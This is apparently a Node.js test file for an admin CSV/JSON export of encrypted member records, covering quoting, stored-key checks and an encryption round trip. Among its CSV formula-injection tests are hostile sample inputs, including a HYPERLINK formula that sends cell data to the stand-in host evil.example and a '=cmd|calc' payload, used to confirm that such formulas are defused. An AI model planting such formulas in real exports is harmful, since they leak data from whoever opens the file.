/*
 * Checks for the pure half of apps/web/admin.js.
 *
 *     node dev/admin.test.mjs
 *
 * The CSV is the product. Everything else in this project exists to get
 * the data to this file intact, and a quoting bug here does not throw
 * and does not look wrong - it produces a file that opens cleanly in a
 * spreadsheet with one column shifted into the next, which is a export
 * nobody can tell from a good one until they act on it.
 *
 * The last section is the one worth having: a record built by the real
 * form, encrypted by the real crypto.js, decrypted, and turned into a
 * row. That is the whole pipeline, end to end, in one check.
 */
import { readFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";

const HERE = (p) => fileURLToPath(new URL(p, import.meta.url));

const load = async (path) => {
  const src = await readFile(HERE(path), "utf8");
  await import("data:text/javascript," + encodeURIComponent(src));
};

await load("../apps/web/admin.js");
await load("../apps/web/form.js");
await load("../apps/web/crypto.js");

const { COLUMNS, entryFor, rowFor, csvCell, toCsv, toJson, fileName,
  storedKeyVerdict, storedKeyNotice } = globalThis.BinderAdmin;
const keyFile = JSON.parse(await readFile(HERE("test-key.json"), "utf8"));

/* A stored row straight to a CSV row. entryFor is the normalization
 * both the CSV and the dashboard read, so it is on the path here too
 * rather than being a step the tests skip. */
const row = (submission, record) => rowFor(entryFor(submission, record));

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

let failures = 0;
const results = [];

async function check(label, fn) {
  let ok = false;
  let note = "";
  try {
    ok = (await fn()) === true;
    if (!ok) note = "returned false";
  } catch (error) {
    note = "threw: " + (error && error.message ? error.message : error);
  }
  if (!ok) failures++;
  results.push([ok, label, note]);
}

/*
 * A stored row and the record inside it, as admin.js sees them.
 *
 * The two identities arrive by different routes and that is the whole
 * point of them: `account_id` is a column the Worker set from a
 * verified sign-in, and `telegram` comes out of the blob the member's
 * own browser sealed. See DESIGN.md, "The identifier is the whole
 * problem".
 */
const SUBMISSION = {
  id: 7,
  account_id: "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f",
  ciphertext: "…",
  received_at: "2026-08-04T12:00:05.000Z",
};
const RECORD = {
  record: 1,
  submittedAt: "2026-08-04T12:00:00.000Z",
  telegram: "somehandle",
  weight: { kg: 90.7, lb: 200 },
  height: { cm: 177.8, totalInches: 70, feet: 5, inches: 10 },
  entered: { units: "imperial", weight: "200 lb", height: "5 ft 10 in" },
  gender: "male",
  roles: ["feedee", "gainer"],
  country: "US",
  over18: true,
};

/* ------------------------------------------------------------------ */
/* Quoting. RFC 4180, and the spreadsheet's own habits.                */

await check("an ordinary value is left alone", () =>
  csvCell("somehandle") === "somehandle");

await check("a value with a comma is quoted", () =>
  csvCell("Bonaire, Sint Eustatius and Saba") ===
    '"Bonaire, Sint Eustatius and Saba"');

/* The one that silently corrupts a file: an unescaped quote ends the
 * field early and every column after it shifts. */
await check("a quote is doubled and the field quoted", () =>
  csvCell('say "hi"') === '"say ""hi"""');

await check("a newline is quoted rather than breaking the row", () =>
  csvCell("two\nlines") === '"two\nlines"');

await check("empty and missing become an empty cell", () =>
  csvCell("") === "" && csvCell(null) === "" && csvCell(undefined) === "");

await check("numbers survive as numbers", () =>
  csvCell(90.7) === "90.7" && csvCell(0) === "0");

/*
 * Formula injection. This file is opened in Excel, Numbers or Sheets,
 * where a cell starting =, +, - or @ is executed rather than shown. The
 * form's validation means nothing legitimate starts that way - but a
 * record is whatever arrived, and the browser that produced it is not
 * one this design trusts.
 */
await check("a leading = is defused", () =>
  csvCell("=1+1") === "'=1+1");

await check("a leading @ is defused", () =>
  csvCell("@SUM(A1)") === "'@SUM(A1)");

/* Defusing and quoting compose: this one needs both, so the cell opens
 * with a quote and the apostrophe sits inside it, where the spreadsheet
 * will read it. */
await check("the classic exfiltration formula is defused", () => {
  const cell = csvCell('=HYPERLINK("http://evil.example/"&A1,"click")');
  return cell.startsWith("\"'=") && cell.includes('""http://evil.example/""');
});

await check("defusing still quotes when it has to", () => {
  const cell = csvCell("=a,b");
  return cell === '"\'=a,b"';
});

/* ------------------------------------------------------------------ */
/* One record to one row.                                              */

await check("a row has one cell per column", () =>
  row(SUBMISSION, RECORD).length === COLUMNS.length);

await check("both unit systems reach the row", () => {
  const cells = row(SUBMISSION, RECORD);
  const cell = (name) => cells[COLUMNS.indexOf(name)];
  return cell("weight_kg") === 90.7 && cell("weight_lb") === 200 &&
    cell("height_cm") === 177.8 && cell("height_feet") === 5 &&
    cell("height_inches") === 10 && cell("height_total_inches") === 70;
});

await check("what was typed reaches the row", () => {
  const cells = row(SUBMISSION, RECORD);
  const cell = (name) => cells[COLUMNS.indexOf(name)];
  return cell("entered_units") === "imperial" &&
    cell("entered_weight") === "200 lb" &&
    cell("entered_height") === "5 ft 10 in";
});

await check("the server's receipt and the client's timestamp are both kept",
  () => {
    const cells = row(SUBMISSION, RECORD);
    return cells[COLUMNS.indexOf("received_at")] === SUBMISSION.received_at &&
      cells[COLUMNS.indexOf("submitted_at")] === RECORD.submittedAt;
  });

await check("roles become one cell", () =>
  row(SUBMISSION, RECORD)[COLUMNS.indexOf("roles")] === "feedee;gainer");

/*
 * A record from an older version of the form will not carry every
 * field. An empty cell is honest; a zero or an "undefined" is a claim
 * about someone's body that nobody made.
 */
await check("a missing field is empty, not undefined", () => {
  const cells = row({ id: 1 }, { telegram: "x" });
  return cells.every((cell) => cell !== undefined && cell !== null) &&
    cells[COLUMNS.indexOf("weight_kg")] === "" &&
    cells[COLUMNS.indexOf("gender")] === "";
});

await check("an absent 18+ confirmation is not reported as yes", () =>
  row(SUBMISSION, Object.assign({}, RECORD, { over18: false }))[
    COLUMNS.indexOf("over18")] === "");

/* ------------------------------------------------------------------ */
/* The file.                                                           */

await check("the header names every column, in order", () =>
  toCsv([]).split("\r\n")[0] === COLUMNS.join(","));

await check("rows are CRLF-terminated, per RFC 4180", () => {
  const csv = toCsv([row(SUBMISSION, RECORD)]);
  return csv.endsWith("\r\n") && csv.split("\r\n").length === 3;
});

await check("a file with no rows is still a valid file", () =>
  toCsv([]) === COLUMNS.join(",") + "\r\n");

await check("the filename carries the export date", () =>
  fileName(Date.UTC(2026, 7, 4, 12, 0, 0)) ===
    "hang-gangs-binder-2026-08-04.csv");

await check("the filename takes the format it is for", () =>
  fileName(Date.UTC(2026, 7, 4), "json") ===
    "hang-gangs-binder-2026-08-04.json");

/* ------------------------------------------------------------------ */
/* The normalization both the CSV and the dashboard read.              */

await check("an entry flattens the record's nesting", () => {
  const entry = entryFor(SUBMISSION, RECORD);
  return entry.kg === 90.7 && entry.lb === 200 && entry.cm === 177.8 &&
    entry.feet === 5 && entry.telegram === "somehandle" &&
    entry.enteredUnits === "imperial" && entry.over18 === true;
});

/*
 * The identity has to survive this function or nothing downstream can
 * group on it, and dashboard.js will silently key on the handle
 * instead - a rename splitting one member into two, a mistyped handle
 * merging two members into one. entryFor is the only reading of a row
 * both the CSV and the charts get, so a field dropped here is dropped
 * everywhere at once and looks like nothing at all.
 */
await check("the account id survives the flattening", () =>
  entryFor(SUBMISSION, RECORD).accountId ===
    "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f");

/* It comes off the submission, never out of the blob. A record is
 * whatever the client sealed, so an `accountId` inside one is a claim
 * the member's own browser wrote and must not be able to move a row
 * into somebody else's history. */
await check("an account id inside the record cannot override the column",
  () => entryFor(SUBMISSION,
    Object.assign({}, RECORD, { accountId: "somebody-elses-account" }))
    .accountId === "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f");

/* Absent rather than invented, and the same null every other missing
 * field uses - dashboard.js keys its fallback on exactly this. */
await check("a row with no account id reports null, not undefined", () =>
  entryFor({ id: 1 }, { telegram: "x" }).accountId === null);

/*
 * The keyholder gets the identity in the file too, and not for
 * completeness. The CSV is what somebody deduplicates in a spreadsheet,
 * and a file that carries only the handle is a file where they
 * reproduce this exact bug by hand. The JSON export serialises the
 * entry object wholesale, so leaving the column out of the CSV would
 * also make the two downloads disagree about what a row is.
 */
await check("the account id is a column of its own", () => {
  const cells = row(SUBMISSION, RECORD);
  return COLUMNS.includes("account_id") &&
    cells[COLUMNS.indexOf("account_id")] ===
      "5f2c9d1e4a7b3c8d6e0f1a2b3c4d5e6f";
});

/* null, not "", so a chart can tell "no weight recorded" from a
 * weight - the CSV turns it into an empty cell on its own. */
await check("an absent number is null in an entry and empty in the CSV",
  () => {
    const entry = entryFor({ id: 1 }, { telegram: "x" });
    return entry.kg === null && entry.gender === null &&
      same(entry.roles, []) &&
      rowFor(entry)[COLUMNS.indexOf("weight_kg")] === "";
  });

/* The entry must not alias the record, or a later edit to one would
 * silently change the other. */
await check("an entry's roles are a copy, not the record's own array", () => {
  const record = Object.assign({}, RECORD, { roles: ["feedee"] });
  const entry = entryFor(SUBMISSION, record);
  entry.roles.push("gainer");
  return record.roles.length === 1;
});

await check("JSON export carries every entry and a count", () => {
  const entries = [entryFor(SUBMISSION, RECORD)];
  const parsed = JSON.parse(toJson(entries));
  return parsed.count === 1 && parsed.submissions.length === 1 &&
    parsed.submissions[0].kg === 90.7 &&
    typeof parsed.exported === "string";
});

/* No quoting rules to get wrong is the point of offering it. */
await check("JSON needs no formula guard", () => {
  const entry = entryFor(SUBMISSION,
    Object.assign({}, RECORD, { telegram: "=cmd|calc" }));
  return JSON.parse(toJson([entry])).submissions[0].telegram === "=cmd|calc";
});

/* ------------------------------------------------------------------ */
/* The key this device keeps - #70.                                    */

/*
 * What IndexedDB hands back is a `CryptoKey` object, never a JWK and
 * never bytes, so a stored record is either a key this page can derive
 * with and cannot export or it is not a stored key at all. These stand
 * in for one at each end of that: `type` and `extractable` are the two
 * properties the whole design rests on, and they are the two this
 * verdict is allowed to trust.
 *
 * The public key is a marker rather than a real point. The comparison
 * is exact string equality against whatever `config.js` carries, so a
 * recognizable string makes a failing check readable and keeps a
 * key-shaped literal out of a file that does not need one.
 */
const EXPECTED_PUBLIC_KEY = "the-public-key-config-js-carries";
const DEVICE_KEY = { type: "private", extractable: false };
const storedRecord = (over) => Object.assign({
  publicKey: EXPECTED_PUBLIC_KEY,
  privateKey: DEVICE_KEY,
  storedAt: "2026-08-08T09:00:00.000Z",
}, over || {});

await check("a stored key for the configured public key is the one to use",
  () => {
    const verdict = storedKeyVerdict(storedRecord(), EXPECTED_PUBLIC_KEY);
    return verdict.key === DEVICE_KEY && verdict.erase === false &&
      verdict.why === null;
  });

/* An empty store is the ordinary state of a device that has never been
 * used for an export. It is not a rejection, so it erases nothing and
 * says nothing - a page that announced "no key found" on every first
 * visit would be noise, and the erase would create the database it
 * claims to be cleaning. */
await check("nothing stored is nothing to erase and nothing to say", () =>
  [undefined, null].every((nothing) => {
    const verdict = storedKeyVerdict(nothing, EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === false &&
      verdict.why === null;
  }));

/*
 * Rotation, seen from the device. `config.js` naming a different public
 * key means the stored private half is the previous one: it opens the
 * rows written before the rotation and nothing since. Using it quietly
 * would report a working export that is missing every recent row, so
 * the mismatch is said out loud and the file - which is the recovery
 * root - is what the keyholder reaches for.
 */
await check("a stored key that is not the site's is surfaced, not used",
  () => {
    const verdict = storedKeyVerdict(
      storedRecord({ publicKey: "some-other-public-key" }),
      EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === true &&
      /not the one this site encrypts to/.test(verdict.why);
  });

/*
 * The property that makes storing the key better than holding it in a
 * textarea, asserted rather than assumed. A record whose key can be
 * exported is not one importPrivateKey wrote, so something else put it
 * there; refusing it is the only reading that does not hand this page's
 * plaintext-adjacent scope an exportable key.
 */
await check("a stored key that could be exported is refused", () =>
  storedKeyVerdict(
    storedRecord({ privateKey: { type: "private", extractable: true } }),
    EXPECTED_PUBLIC_KEY).erase === true);

/*
 * The prefill's rule, on data with more at stake - #65. Every rejection
 * erases, in one place, so the guard somebody adds next cannot silently
 * keep what it refused. A single accept and one exit is what makes that
 * true by construction rather than by review.
 */
await check("every refusal of a stored record erases it and says why", () =>
  [
    storedRecord({ privateKey: undefined }),
    storedRecord({ privateKey: { type: "public", extractable: false } }),
    storedRecord({ privateKey: { type: "private", extractable: true } }),
    storedRecord({ publicKey: undefined }),
    storedRecord({ publicKey: "" }),
    storedRecord({ publicKey: "some-other-public-key" }),
    "not a record at all",
    42,
  ].every((record) => {
    const verdict = storedKeyVerdict(record, EXPECTED_PUBLIC_KEY);
    return verdict.key === null && verdict.erase === true &&
      typeof verdict.why === "string" && verdict.why.length > 0;
  }));

/* An unknown host gets no public key from config.js, so there is
 * nothing to check a stored key against. Accepting one on the strength
 * of "well, something is stored" is the failure this whole verdict
 * exists to prevent. */
await check("with no configured public key nothing stored is usable", () =>
  ["", null, undefined].every((expected) => {
    const verdict = storedKeyVerdict(storedRecord(), expected);
    return verdict.key === null && verdict.erase === true;
  }));

/*
 * What the keyholder is told about durability, which is the half of
 * this feature that can only be got wrong in words. navigator.storage
 * .persist() is a request: granted, the origin is exempt from eviction
 * under pressure and from the seven-day rule WebKit applies to origins
 * without it; refused, the key is best-effort. Copy that reads
 * "stored" as "safe" is what leaves somebody with no file in reach on
 * the day it turns out otherwise - see the spike on #85.
 */
await check("both notices say where the key is", () =>
  [true, false].every((granted) =>
    /on this device/.test(storedKeyNotice(granted))));

await check("a refused persistence request warns, and names the way back",
  () => {
    const notice = storedKeyNotice(false);
    return /evict/i.test(notice) && /key file/i.test(notice);
  });

/* A grant is not a guarantee, and the copy must not read as one: the
 * keyholder can still clear this site's data, and Clear still destroys
 * it on purpose. */
await check("a granted request still says what removes the key", () =>
  /clear/i.test(storedKeyNotice(true)));

await check("neither notice promises the key cannot be lost", () =>
  [true, false].every((granted) =>
    !/\b(forever|permanent(ly)?|guaranteed|always be here)\b/i.test(
      storedKeyNotice(granted))));

/* ------------------------------------------------------------------ */
/* The whole pipeline.                                                 */

await check("a submitted record survives encryption and reaches the CSV",
  async () => {
    const record = globalThis.BinderForm.buildRecord({
      telegram: "@SomeHandle",
      units: "imperial",
      weightLb: "200",
      heightFeet: "5",
      heightInches: "10",
      gender: "male",
      roles: ["feedee", "gainer"],
      country: "US",
      over18: true,
    }, Date.UTC(2026, 7, 4, 12, 0, 0), "@SomeHandle");

    const blob = await globalThis.BinderCrypto.encrypt(
      record, keyFile.publicKey);
    const back = await globalThis.BinderCrypto.decrypt(blob, keyFile);

    const csv = toCsv([row(
      { id: 1, received_at: "2026-08-04T12:00:05.000Z" }, back)]);
    const cells = csv.split("\r\n")[1].split(",");
    const cell = (name) => cells[COLUMNS.indexOf(name)];

    return cell("telegram") === "somehandle" &&
      cell("weight_kg") === "90.7" && cell("weight_lb") === "200" &&
      cell("height_cm") === "177.8" && cell("height_feet") === "5" &&
      cell("roles") === "feedee;gainer" && cell("over18") === "yes";
  });

/* A row that will not open must be reported, not skipped. This proves
 * the throw admin.js counts on actually happens. */
await check("a row encrypted to another key refuses to open", async () => {
  const otherKey = await crypto.subtle.generateKey(
    { name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
  const raw = new Uint8Array(
    await crypto.subtle.exportKey("raw", otherKey.publicKey));
  let binary = "";
  for (const b of raw) binary += String.fromCharCode(b);

  const blob = await globalThis.BinderCrypto.encrypt(
    { telegram: "x" }, btoa(binary));
  try {
    await globalThis.BinderCrypto.decrypt(blob, keyFile);
    return false;
  } catch (error) {
    return /could not be opened/.test(error.message);
  }
});

/* ------------------------------------------------------------------ */

for (const [ok, label, note] of results) {
  console.log((ok ? "  ok   " : "  FAIL ") + label + (note ? " - " + note : ""));
}
console.log(
  failures === 0
    ? "\nadmin.js OK - " + results.length + " checks"
    : "\nadmin.js FAILED " + failures + " of " + results.length + " checks");

process.exit(failures === 0 ? 0 : 1);
